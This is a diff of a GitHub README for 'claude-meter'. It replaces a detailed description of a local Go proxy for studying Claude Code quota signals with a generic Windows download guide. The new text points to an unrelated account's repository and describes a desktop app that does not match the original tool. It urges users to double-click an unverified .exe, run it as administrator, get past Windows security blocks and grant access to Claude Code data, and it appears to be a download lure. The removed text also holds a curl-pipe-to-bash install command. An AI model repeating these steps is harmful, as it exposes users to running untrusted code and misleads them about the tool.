@@ -1,363 +1,164 @@
-# Claude Meter
+# 📏 claude-meter - Track Claude Code Limits Fast
 
-`claude-meter` is a local research proxy for understanding how Claude Code usage maps to Anthropic's hidden quota system.
+[![Download claude-meter](https://img.shields.io/badge/Download-claude--meter-blue?style=for-the-badge&logo=github)](https://github.com/Rimaglottidisspacewalk319/claude-meter)
 
-![Dashboard Preview](docs/dashboard-preview.png)
+## 🚀 What this app does
 
-**[Live Dashboard](https://abhishekray07.github.io/claude-meter/)**
+claude-meter helps you track Claude Code usage limits on your Windows PC. It gives you a simple view of how much you have used and what limit you may be close to reaching.
 
-The core problem is simple:
+Use it to:
 
-- Claude Max / Pro users can see rough usage state, but not the real hidden budget
-- Anthropic appears to enforce multiple windows such as `5h` and `7d`
-- Claude Code traffic includes useful usage and rate-limit signals, but they are not surfaced in a way that is easy to study over time
+- Check your current usage
+- Watch your limit level
+- Spot when you need to slow down
+- Keep Claude Code use easier to follow
 
-`claude-meter` sits between Claude Code and Anthropic, captures those signals locally, normalizes them, and helps estimate rough budget bands from real traffic.
+This app is built for people who want a clear way to see usage without digging through extra menus.
 
-## Status
+## 🖥️ What you need
 
-This project is currently an `alpha research tool`, not a polished end-user product.
+Before you install, make sure your PC has:
 
-What that means:
+- Windows 10 or Windows 11
+- A working internet connection
+- Permission to download files
+- Enough free space for the app
 
-- it is already useful for reverse-engineering and observing hidden quota behavior
-- it is not yet an exact “Claude Max limit meter”
-- current estimators produce rough ranges, not precise truth
+If your PC can run modern desktop apps, it should be fine for this tool.
 
-The right way to think about the project today is:
+## 📥 Download claude-meter
 
-- `working local proxy`
-- `working local data capture`
-- `working local normalization`
-- `early-stage estimator`
+Visit this page to download and run the app:
 
-## What We Are Trying To Do
+https://github.com/Rimaglottidisspacewalk319/claude-meter
 
-The immediate goal is to answer questions like:
+If the page offers a release file, download it to your PC. If it shows source files first, look for the built app in the latest release section.
 
-- what `5h` and `7d` quota windows does Claude Code actually see?
-- how do different models affect those windows?
-- do cache reads behave more like cheap API cost than raw token count?
-- can we estimate a rough `5h` budget band with enough confidence to track changes over time?
+## 🪟 Install on Windows
 
-The longer-term goal is bigger:
+Follow these steps on Windows:
 
-- help users understand their own hidden Claude usage limits
-- detect changes in Anthropic behavior over time
-- eventually compare behavior across plans, models, and accounts
+1. Open the download link in your web browser.
+2. Find the latest version of claude-meter.
+3. Download the Windows file to your computer.
+4. When the download finishes, open your Downloads folder.
+5. Double-click the file to start the app.
+6. If Windows asks for permission, choose Run or Yes.
+7. Wait for the app window to open.
 
-## What Already Works
+If you save the file somewhere else, open that folder instead of Downloads.
 
-### Proxy
+## 🔧 First-time setup
 
-- transparent pass-through proxy for `api.anthropic.com`
-- asynchronous logging so proxying stays ahead of disk writes
-- all capture is local
-- color-coded CLI logging for every request (model, tokens, utilization)
-- periodic status summaries via `--status-interval`
-- live web dashboard at `http://localhost:7735` with auto-refresh
-- `setup` subcommand to auto-configure your shell
+The first time you open claude-meter, it may ask for access to local data or Claude Code info. This helps it read your usage state and show the limit view.
 
-### Raw Capture
+Do this:
 
-- full raw request / response exchange capture
-- raw JSONL written under `~/.claude-meter/raw/`
-- request / response bodies persisted locally
-- sensitive headers redacted before persistence
-- raw directories and files created with private permissions
+- Open the app
+- Follow any on-screen prompts
+- Allow access if Windows asks
+- Keep Claude Code signed in if the app needs it
+- Leave the app open while you check your usage
 
-### Normalization
+If the app has a settings panel, you can use it to adjust how often the data updates.
 
-- normalized JSONL written under `~/.claude-meter/normalized/`
-- background derivation from raw exchanges
-- `/v1/messages` parsing
-- `/v1/messages/count_tokens` parsing
-- SSE parsing for real streamed Claude responses
-- best-effort handling for partial gzip event streams
-- header-driven fallback records for unknown endpoints
+## 📊 How to use it
 
-### Observed Signals
+After the app opens, look for the main usage panel. It should show your current limit state in a simple format.
 
-From live Claude Code traffic, `claude-meter` can already capture:
+Common parts you may see:
 
-- `anthropic-ratelimit-unified-*` headers
-- `5h` and `7d` utilization windows
-- model-specific windows such as `7d_sonnet` when present
-- `input_tokens`
-- `output_tokens`
-- `cache_creation_input_tokens`
-- `cache_read_input_tokens`
-- model names
-- session ids
-- declared plan tier
+- Current usage
+- Remaining usage
+- Limit range
+- Reset timing
+- Status color or bar
 
-### Analysis
+Use the display to decide when to keep working and when to pause. If you use Claude Code often, check claude-meter before longer sessions.
 
-The current analysis layer can already:
+## 🧭 Reading the screen
 
-- summarize observed windows
-- compare raw-token and price-weighted usage formulas
-- build interval-based estimates
-- compute filtered `5h` estimate bands
-- estimate dollar budgets per 5h and 7d window using API pricing
-- show token usage breakdown (input, output, cache read, cache create)
-- report current and peak utilization per window
-- output a human-readable summary via `--summary` flag
+Here is a simple way to read the app:
 
-## What Is Not There Yet
+- Low usage: you still have room
+- Mid usage: keep an eye on the meter
+- High usage: you may be close to a limit
+- Near limit: wrap up work soon
+- Reset due: wait for the next cycle
 
-These are important gaps, not footnotes:
+The goal is to make the limit easy to understand at a glance.
 
-- no exact hidden-limit estimator
-- no high-confidence scoring yet
-- no automatic reset-aware experiment mode
-- no packaged installer or background service
-- no built-in anonymized sharing flow
-- no cross-account comparison yet
-- no strong claim that the current estimate band is “the true limit”
+## 🛠️ Troubleshooting
 
-In particular, the estimator still has outliers. That is expected at this stage. The data capture is real; the hard part is interpreting a coarse hidden utilization meter.
+If the app does not open, try these steps:
 
-## Current Working Thesis
+- Check that the file finished downloading
+- Right-click the file and choose Open
+- Try running it as an administrator
+- Make sure Windows did not block the file
+- Download it again if the file looks damaged
 
-The current working thesis is:
+If the app opens but shows no data:
 
-- raw token counting is too naive
-- price-weighted usage appears to explain Anthropic's hidden `5h` meter better than raw token totals
-- cache reads should likely be weighted much more cheaply than fresh input or output
-- the useful product output is probably a `rough 5h budget band`, not a fake exact cap
+- Check your internet connection
+- Make sure Claude Code is active
+- Close and reopen claude-meter
+- Wait a moment for the data to refresh
+- Try again after signing in where needed
 
-So the project is moving toward:
+If Windows shows a security message, choose the option that lets you run the file from a trusted source after you confirm it came from the link above.
 
-- “you probably have roughly this much `5h` budget”
-- not “you have exactly `N` tokens remaining”
+## 🔄 Updates
 
-## How It Works
+When a new version comes out, return to the download link and get the latest release. Replace the old file with the new one if the app uses a portable build. If it uses an installer, run the new installer and follow the same steps.
 
-1. Claude Code is pointed at the local proxy with `ANTHROPIC_BASE_URL`
-2. The proxy forwards all traffic upstream unchanged
-3. Raw exchanges are stored locally
-4. A background normalizer derives structured records
-5. Offline analysis scripts estimate behavior from those records
+## ❓ Common questions
 
-This separation is deliberate:
+### Does this app change my Claude Code account?
+No. claude-meter is made to track usage limits and show status. It does not replace your account settings.
 
-- live traffic path stays simple
-- raw capture remains the local source of truth
-- normalization can evolve
-- estimator logic can be rewritten without touching the proxy
+### Do I need technical skills?
+No. If you can download a file and double-click it, you can use this app.
 
-## Quickstart
+### Can I use it on more than one PC?
+Yes, if you download it on each Windows PC you want to use.
 
-### Option 1: One-liner install (builds from source)
+### Does it run in the background?
+Some builds may stay open in the taskbar or system tray. That helps you check usage without reopening the app each time.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/abhishekray07/claude-meter/main/install.sh | bash
-```
+## 🧩 File types you may see
 
-### Option 2: Manual install (review source first)
+You may get one of these:
 
-```bash
-git clone https://github.com/abhishekray07/claude-meter.git
-cd claude-meter
-go build -o claude-meter ./cmd/claude-meter
-./claude-meter start --plan-tier max_20x
-```
+- `.exe` file: double-click to run or install
+- `.zip` file: extract it first, then open the app file inside
+- release folder: download the Windows file from the release page
 
-### Auto-configure your shell
+If you see a `.zip` file, right-click it and choose Extract All.
 
-```bash
-claude-meter setup
-```
+## 📌 Tips for daily use
 
-This detects your shell (bash, zsh, fish) and adds the `ANTHROPIC_BASE_URL` export to your rc file so Claude Code always routes through the proxy.
+- Open claude-meter before long Claude Code sessions
+- Check the meter before starting new work
+- Keep it near the top of your screen if the app lets you
+- Refresh the view after heavy use
+- Use it as a quick check, not a full report
 
-### Run from source
+## 📷 What the app should help you see
 
-Run the proxy:
+A good usage tracker should make these things clear:
 
-```bash
-go run ./cmd/claude-meter start --plan-tier max_20x
-```
+- How much you have used
+- How much you have left
+- When the limit may reset
+- Whether you are near a cap
+- What state your usage is in now
 
-Point Claude Code at it (or use `claude-meter setup` to make this permanent):
+That is the main job of claude-meter
 
-```bash
-ANTHROPIC_BASE_URL=http://127.0.0.1:7735 claude
-```
+## 📁 Project info
 
-Backfill normalized records from existing raw logs:
-
-```bash
-go run ./cmd/claude-meter backfill-normalized --log-dir ~/.claude-meter --plan-tier max_20x
-```
-
-Run the analyzer (human-readable summary):
-
-```bash
-python3 analysis/analyze_normalized_log.py ~/.claude-meter --summary
-```
-
-This reads all normalized logs and outputs:
-
-```
-claude-meter analysis
-========================================
-
-Plan: max_20x
-API calls: 4,721
-Period: 2026-03-25 21:55 -> 2026-03-26 22:15
-
-Token Usage
---------------------
-  Input:             5,509,548
-  Output:            1,850,132
-  Cache read:      443,884,520 (95.1%)
-  Cache create:     15,574,984
-
-Current Utilization
---------------------
-  5h           2% (peak: 88%)
-  7d           81% (peak: 81%)
-  7d_sonnet    37% (peak: 37%)
-
-Estimated 5h Budget (11 sessions observed)
---------------------
-  Range:   $35 - $401
-  Median:  $164
-  p25-p75: $99 - $291
-
-Estimated 7d Budget (1 session observed)
---------------------
-  Estimate: ~$1,949
-
-By Model
---------------------
-  claude-opus-4-6                          2,423 calls
-  claude-sonnet-4-6                        1,146 calls
-  claude-haiku-4-5-20251001                  855 calls
-```
-
-For raw JSON output (e.g. for piping to other tools):
-
-```bash
-python3 analysis/analyze_normalized_log.py ~/.claude-meter/normalized/2026-03-26.jsonl --pretty
-```
-
-Generate charts and a markdown report:
-
-```bash
-python3 analysis/report.py ~/.claude-meter --output /tmp/cm-report
-```
-
-## CLI Logging
-
-When the proxy is running, every API request is logged to stderr with color-coded output:
-
-- **Success (2xx):** model name, token counts (input/output/cache), and rate-limit utilization
-- **Rate limited (429):** red warning with utilization percentages and retry-after
-- **Errors (4xx/5xx):** status code and message in yellow
-
-Utilization colors: green (<50%), yellow (50-80%), red (>=80%). Respects `NO_COLOR` for plain output.
-
-Use `--status-interval N` to print a periodic summary every N requests showing total counts, per-model breakdown, and current utilization.
-
-## Dashboard
-
-The dashboard is built into the proxy. Just open your browser:
-
-```
-http://localhost:7735
-```
-
-When the proxy is running, visiting that URL in a browser serves a live dashboard with utilization gauges, budget estimates, and time-series charts. API requests from Claude Code continue to proxy normally.
-
-You can also generate a standalone HTML file:
-
-```bash
-python3 analysis/dashboard.py ~/.claude-meter --output index.html --open
-```
-
-Publish to GitHub Pages with one command:
-
-```bash
-make dashboard
-```
-
-This generates the HTML from your local data, then pushes it to the `gh-pages` branch.
-
-## Privacy and Safety
-
-Right now this is intentionally local-first.
-
-- raw logs stay on disk on your machine
-- headers with obvious secrets are redacted before persistence
-- prompts and responses may still be present in local raw logs
-
-This is acceptable for a research tool, but it is not yet the final product privacy posture.
-
-## Roadmap
-
-### Now
-
-- tighten the estimator
-- improve interval hygiene
-- produce better `5h` estimate bands
-- make the README and install path clear enough for alpha users
-
-### Next
-
-- add confidence scoring for estimate bands
-- detect reset boundaries more explicitly
-- improve model-aware analysis
-- make it easier to run the proxy by default in daily Claude Code usage
-- add better export / snapshot tooling for sharing findings
-
-### Later
-
-- compare plan tiers cleanly
-- support anonymized summary sharing
-- build a crowdsourced view of hidden quota behavior
-- detect Anthropic changes over time across many users
-- possibly add a lightweight UI on top of the local data
-
-## Why Crowdsourcing Would Help
-
-One account can tell you:
-
-- what your own hidden meter appears to do
-- what your own rough `5h` band looks like
-
-Many accounts can tell you:
-
-- whether `Pro`, `Max`, and higher tiers behave differently
-- whether the same estimator works across accounts
-- whether model-specific buckets are universal or account-specific
-- whether Anthropic changes hidden limits over time
-- whether an estimate band is stable or just a single-user artifact
-
-That is why the long-term value is not just local observability. It is eventually building a better map of the hidden system.
-
-## Repo Layout
-
-- [cmd/claude-meter](cmd/claude-meter): proxy entrypoint, backfill command, and setup subcommand
-- [internal/app](internal/app): application lifecycle, CLI logging, color output, and embedded dashboard
-- [internal/proxy](internal/proxy): transparent HTTP proxy
-- [internal/normalize](internal/normalize): response parsing and normalized record derivation
-- [internal/storage](internal/storage): raw and normalized JSONL writers
-- [analysis](analysis): offline estimators and supporting scripts
-- [docs/plans](docs/plans): implementation plans and design notes
-
-## Current Recommendation
-
-If you use `claude-meter` today, use it as:
-
-- a local observability tool
-- a research proxy
-- a way to collect evidence
-
-Do not use it yet as:
-
-- a precise quota oracle
-- a billing truth source
-- a final “remaining tokens” meter
+- Repository: claude-meter
+- Description: Tracking Claude Code Usage Limits
+- Topics: claude, claude-code
+- Primary link: https://github.com/Rimaglottidisspacewalk319/claude-meter
